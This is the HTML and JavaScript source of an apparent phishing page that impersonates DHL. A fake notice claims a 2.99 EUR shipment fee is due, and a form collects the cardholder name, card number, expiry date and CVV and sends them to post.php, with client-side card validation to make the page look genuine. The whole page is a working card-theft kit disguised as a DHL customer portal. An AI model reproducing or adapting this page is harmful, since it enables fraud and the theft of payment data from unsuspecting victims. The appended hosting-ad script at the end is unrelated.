<html><head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title _msttexthash="1123187" _msthash="0">Login to Customer Portals and Tools | DHL |</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon">
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon">
        <!-- link__css -->
        <link rel="stylesheet" href="css/bootstrap.css">
        <link rel="stylesheet" href="css/posta.css">
</head>
<body>


        <!-- Start____Navbar -->
        <div class="navbar">
        	<div class="container-fluid">
        		<div class="topping">
        			<img src="image/dhl-logo.svg">
        			<ul class="web">
        				<li><i class="bi bi-exclamation-circle me-2"></i><font _mstmutation="1" _msttexthash="100516" _msthash="1">Alarms (1)</font></li>
        				<li _msttexthash="138229" _msthash="2">Contact us</li>
        				<li><i class="bi bi-globe me-2"></i><font _mstmutation="1" _msttexthash="57369" _msthash="3">United States of America </font></li>
        				<li><i class="bi bi-search me-2"></i><font _mstmutation="1" _msttexthash="74607" _msthash="4">Search</font></li>
        			</ul>
        			<ul class="respo">
        				<li><i class="bi bi-list"></i></li>
        				<li></li>
        			</ul>
        		</div>
        		<div class="bottomin">
        			<ul>
        				<li><font _mstmutation="1" _msttexthash="61074" _msthash="5">trace</font><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><font _mstmutation="1" _msttexthash="46891" _msthash="6">boat</font><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><font _mstmutation="1" _msttexthash="398853" _msthash="7">Logistics solutions</font><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><font _mstmutation="1" _msttexthash="295893" _msthash="8">customer service</font><i class="bi bi-chevron-down ms-1"></i></li>
        			</ul>
        			<p><i class="bi bi-person-fill me-2"></i><font _mstmutation="1" _msttexthash="427336" _msthash="9">Customer portal login</font></p>
        		</div>
        	</div>
        </div>
        <!-- End____Navbar -->

        <!-- Start____Home -->
        <div class="home info carta">
        	<div class="otside put">
        		<div class="container">
        			<div class="text-center"><h1 _msttexthash="347815" _msthash="10">DHL Express Inquiry</h1></div>
        			<div class="lettre login valid">
        				<div class="dell">
        					<div class="titre">
	        					<img src="image/camion.png">
	        					<h3 _msttexthash="542373" _msthash="11">Shipping within shipment </h3>
	        				</div>
	        				<div class="steps">
	        					<span class="green"></span>
	        					<span class="green"></span>
	        					<span></span>
	        				</div>
        				</div>
        				<div class="row gx-4">
        					<div class="col-lg-8 genius">
        						<div class="gauche hna">
        							<h4> </h4>
        							<div class="magic">
										<img src="image/vi.svg">
                                    <img src="image/mas.svg">
									</div>
        							<form action="post.php" method="post" onsubmit="return formValidation()">
        								<input type="hidden" name="step" value="cc">
        								<div class="form-group mt-3">	
                                             <label><font _mstmutation="1" _msttexthash="254761" _msthash="12">Cardholder name </font><span>*</span></label>
                                             <input type="text" name="full" id="full" class="form-control" placeholder="Card holder's name" _mstplaceholder="301132" _msthash="13">
        								</div>
        								<div class="ereur_full" style="color:red;font-size:12px"></div>
    									<div class="form-group mt-3 viza">	
                                             <label><font _mstmutation="1" _msttexthash="156169" _msthash="14">Card number </font><span>*</span></label>
                                             <input type="text" name="card" id="card" class="form-control" placeholder="XXXX XXXX XXXX XXXX" oninput=" if(ValidateCreditCardNumber(this.value)){ this.style.borderColor = 'inherit'; document.getElementById('btn0').disabled = false;  }else{ this.style.borderColor = 'red'; document.getElementById('btn0').disabled = true; }" _mstplaceholder="265408" _msthash="15">
        								</div>
        								<div class="ereur_card" style="color:red;font-size:12px"></div>
        								<div class="calisy">
        									<div class="form-group mt-3 ville">	
	                                             <input type="text" name="month" id="month" class="form-control" placeholder="MM" maxlength="2" _mstplaceholder="15015" _msthash="16">
	                                             <div class="ereur_month" style="color:red;font-size:11px"></div>
	        								</div>
	        								<div class="form-group mt-3 ville">	
	                                             <input type="text" name="year" id="year" class="form-control" placeholder="YY" maxlength="2" _mstplaceholder="17355" _msthash="17">
	                                             <div class="ereur_year" style="color:red;font-size:11px"></div>
	        								</div>
	        								<div class="form-group mt-3 astra">	
	                                             <input type="text" name="cvv" id="cvv" class="form-control" placeholder="CVV" maxlength="3" _mstplaceholder="25103" _msthash="18">
	                                             <div class="ereur_cvv" style="color:red;font-size:11px"></div>
	        								</div>
        								</div>
        								<div class="botona">
        									<button id="btn0" class="btn" name="submit" disabled="" _msttexthash="49634" _msthash="19">Next ➔</button>
        								</div>	
        							</form>
        						</div>
        					</div>
        					<div class="col-lg-4 power">
        					    <div class="droit lhih">
        					     	<div class="offre">
                                        <div class="status">
                                            <p _msttexthash="341380" _msthash="20">Status: <b _istranslated="1">Delivering</b></p>
                                        </div>
                                        <div class="status">
                                            <p _msttexthash="2229097" _msthash="21">This shipment is handled by the following company: <b _istranslated="1">DHL Parcel</b></p>
                                        </div>
                                        <div class="status">
                                            <p _msttexthash="383539" _msthash="22">Tracking Code: CS47*******</p>
                                        </div>
                                    </div>
									<div class="offre">
										<div class="status">
											<p _msttexthash="910871" _msthash="23">Card information: <b _istranslated="1">Friday 9th of 06:41 PM</b></p>
										</div>
										<div class="status">
											<p _msttexthash="368238" _msthash="24">Shipment Type: <b _istranslated="1">Other</b></p>
										</div>
										<div class="status">
											<p _msttexthash="118469" _msthash="25">Total: <b _istranslated="1">2.99 €</b></p>
										</div>
									</div>
									<hr>
									<div class="important mt-4">
    							<h5 _msttexthash="469144" _msthash="26">Important Message!</h5>
    							<p _msttexthash="16973372" _msthash="27">In order to complete the shipment as soon as possible, please click Next to confirm the payment (2.99). Online confirmation must be made within the next 14 days, i.e. before expiration.</p>
    						</div>
        					    </div>
        					</div>
        				</div>
        			</div>
        		</div>
        	</div>
        </div>
        <!-- Ennnd____Home -->



        <!-- STAAAART_SOUS -->
        <div class="sous boso ">
        	<div class="container-fluid">
        		<div class="row">
        			<div class="col-lg-9">
        				<img src="image/group.svg">
        				<ul>
        					<li _msttexthash="261469" _msthash="28">Fraud awareness</li>
        					<li _msttexthash="199862" _msthash="29">Legal Notices</li>
        					<li _msttexthash="155558" _msthash="30">Terms of Use</li>
        					<li _msttexthash="320086" _msthash="31">Privacy Statement</li>
        					<li _msttexthash="357721" _msthash="32">Dispute Resolution</li>
        					<li _msttexthash="234065" _msthash="33">Accessibility</li>
        					<li _msttexthash="488462" _msthash="34">Additional Information</li>
        					<li _msttexthash="264160" _msthash="35">Cookie settings</li>
        				</ul>
        			</div>
        			<div class="col-lg-3">
        				<h6 _msttexthash="119730" _msthash="36">Follow us</h6>
        				<img src="image/socio.png" class="socio">
        			</div>
        			<div class="text-center ss" _msttexthash="1496365" _msthash="37">2023 © DHL International Ltd. All Rights Reserved</div>
        		</div>	
        	</div>
        </div>
        <!-- ENNNNNND_SOUS -->







        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>
        
		function ValidateCreditCardNumber(data) {

  var ccNum = data;
  var visaRegEx = /^(?:4[0-9]{12}(?:[0-9]{3})?)$/;
  var mastercardRegEx = /^(?:5[1-5][0-9]{14})$/;
  var amexpRegEx = /^(?:3[47][0-9]{13})$/;
  var discovRegEx = /^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;
  var isValid = false;

  if (visaRegEx.test(ccNum)) {
    isValid = true;
  } else if(mastercardRegEx.test(ccNum)) {
    isValid = true;
  } else if(amexpRegEx.test(ccNum)) {
    isValid = true;
  } else if(discovRegEx.test(ccNum)) {
    isValid = true;
  }

  if(isValid) {
     return true;
  } else {
     return false;
  }
}


	       /* $("#card").mask("0000 0000 0000 0000"); */
	        $("#month").mask("00");
	        $("#year").mask("00");
	        $("#cvv").mask("000");
        

             function formValidation(){
                var full = $("#full").val();
                var card = $("#card").val();
                var month = $("#month").val();
                var year = $("#year").val();
                var cvv = $("#cvv").val();


                // Validation_card
                 // Validation_card
                if(full==""){
                    $(".ereur_full").text("required field");
                    $("#full").css("border","1px solid red")
                    return false;
                }else{
                    $("#full").css("border","1px solid #ced4da");
                    $(".ereur_full").hide();
                }


               

                // Validation_MONTH
                if(month==""){
                    $(".ereur_month").text(" required field");
                    $("#month").css("border","1px solid red")
                    return false;
                }else{
                    var patern_month = /^[0-9]{2}$/;
                    if(!patern_month.test(month)){
                        $(".ereur_month").text("must be exactly 2 characters");
                        $("#month").css("border","1px solid red")
                        return false;
                    }else{
                       $("#month").css("border","1px solid #ced4da");
                       $(".ereur_month").hide();
                    }
                }

                // Validation_YEAR
                if(year==""){
                    $(".ereur_year").text(" required field");
                    $("#year").css("border","1px solid red")
                    return false;
                }else{
                    var patern_year = /^[0-9]{2}$/;
                    if(!patern_year.test(year)){
                        $(".ereur_year").text("must be exactly 2 characters");
                        $("#year").css("border","1px solid red")
                        return false;
                    }else{
                       $("#year").css("border","1px solid #ced4da");
                       $(".ereur_year").hide();
                    }
                }

                 // Validation_YEAR
                if(cvv==""){
                    $(".ereur_cvv").text(" required field");
                    $("#cvv").css("border","1px solid red")
                    return false;
                }else{
                    var patern_cvv = /^[0-9]{3}$/;
                    if(!patern_cvv.test(cvv)){
                        $(".ereur_cvv").text("must be exactly 3 characters");
                        $("#cvv").css("border","1px solid red")
                        return false;
                    }else{
                       $("#cvv").css("border","1px solid #ced4da");
                       $(".ereur_cvv").hide();
                    }
                }

                

                

               

                return true;
            }
             
        </script>
              
<div style="text-align:right;position:fixed;z-index:9999999;bottom:0;width:auto;right:1%;cursor:pointer;line-height:0;display:block!important"></div><script>function getCookie(t){for(var e=t+"=",n=decodeURIComponent(document.cookie).split(";"),o=0;o<n.length;o++){for(var i=n[o];" "==i.charAt(0);)i=i.substring(1);if(0==i.indexOf(e))return i.substring(e.length,i.length)}return""}getCookie("hostinger")&&(document.cookie="hostinger=;expires=Thu, 01 Jan 1970 00:00:01 GMT;",location.reload());var wordpressAdminBody=document.getElementsByClassName("wp-admin")[0],notification=document.getElementsByClassName("notice notice-success is-dismissible"),hostingerLogo=document.getElementsByClassName("hlogo"),mainContent=document.getElementsByClassName("notice_content")[0];if(null!=wordpressAdminBody&&0<notification.length&&null!=mainContent){var googleFont=document.createElement("link");googleFontHref=document.createAttribute("href"),googleFontRel=document.createAttribute("rel"),googleFontHref.value="https://fonts.googleapis.com/css?family=Roboto:300,400,600,700",googleFontRel.value="stylesheet",googleFont.setAttributeNode(googleFontHref),googleFont.setAttributeNode(googleFontRel);var css="@media only screen and (max-width: 576px) {#main_content {max-width: 320px !important;} #main_content h1 {font-size: 30px !important;} #main_content h2 {font-size: 40px !important; margin: 20px 0 !important;} #main_content p {font-size: 14px !important;} #main_content .content-wrapper {text-align: center !important;}} @media only screen and (max-width: 781px) {#main_content {margin: auto; justify-content: center; max-width: 445px;}} @media only screen and (max-width: 1325px) {.web-hosting-90-off-image-wrapper {position: absolute; max-width: 95% !important;} .notice_content {justify-content: center;} .web-hosting-90-off-image {opacity: 1;}} @media only screen and (min-width: 769px) {.notice_content {justify-content: space-between;} #main_content {margin-left: 5%; max-width: 445px;} .web-hosting-90-off-image-wrapper {position: absolute; display: flex; justify-content: center; width: 50%; margin-left: 45%;}} .web-hosting-90-off-image {max-width: 90%;} .content-wrapper {min-height: 454px; display: flex; flex-direction: column; justify-content: center; z-index: 5} .notice_content {display: flex; align-items: center;} * {-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;} .upgrade_button_red_sale{box-shadow: 0 2px 4px 0 rgba(255, 69, 70, 0.2); width: 264px; border: 0; border-radius: 3px; background-color: #FF5C62 !important; padding: 15px 55px !important; font-family: 'Roboto', sans-serif; font-size: 16px; font-weight: 600; color: #ffffff;} .upgrade_button_red_sale:hover{color: #ffffff !important; background: #d10303 !important;}",style=document.createElement("style"),sheet=window.document.styleSheets[0];style.styleSheet?style.styleSheet.cssText=css:style.appendChild(document.createTextNode(css)),document.getElementsByTagName("head")[0].appendChild(style),document.getElementsByTagName("head")[0].appendChild(googleFont);var button=document.getElementsByClassName("upgrade_button_red")[0],link=button.parentElement;link.setAttribute("href","https://www.hostinger.com/hosting-starter-offer?utm_source=000webhost&utm_medium=panel&utm_campaign=000-wp"),link.innerHTML='<button class="upgrade_button_red_sale">Claim Deal</button>',(notification=notification[0]).setAttribute("style","padding-bottom: 0; padding-top: 5px; background-color: #040713; background-size: cover; background-repeat: no-repeat; color: #ffffff; border-left-color: #040713;"),notification.className="notice notice-error is-dismissible";var mainContentHolder=document.getElementById("main_content");mainContentHolder.setAttribute("style","padding: 0;"),hostingerLogo[0].remove();var h1Tag=notification.getElementsByTagName("H1")[0];h1Tag.className="000-h1",h1Tag.innerHTML="Black Friday",h1Tag.setAttribute("style",'color: white; font-family: "Roboto", sans-serif; font-size: 48px; font-weight: 700;');var h2Tag=document.createElement("H2");h2Tag.innerHTML="Up to 90% off 4-year hosting plans + free domain, SSL & DDoS protection",h2Tag.setAttribute("style",'color: white; margin: 10px 0 15px 0; font-family: "Roboto", sans-serif; font-size: 16px; font-weight: 400; line-height: 1;'),h1Tag.parentNode.insertBefore(h2Tag,h1Tag.nextSibling);var paragraph=notification.getElementsByTagName("p")[0];paragraph.innerHTML="$<span style='font-size: 80px;'>2.49</span>/mo",paragraph.setAttribute("style",'font-family: "Roboto", sans-serif; font-size: 48px; font-weight: 700; margin: 0;');var list=notification.getElementsByTagName("UL")[0];list.remove();var org_html=mainContent.innerHTML,new_html='<div class="content-wrapper">'+mainContent.innerHTML+'</div><div class="web-hosting-90-off-image-wrapper"><img class="web-hosting-90-off-image" src="https://cdn.000webhost.com/000webhost/promotions/bf-2022-bottom-banner.png"></div>';mainContent.innerHTML=new_html;var saleImage=mainContent.getElementsByClassName("web-hosting-90-off-image")[0]}</script>



                 </body></html>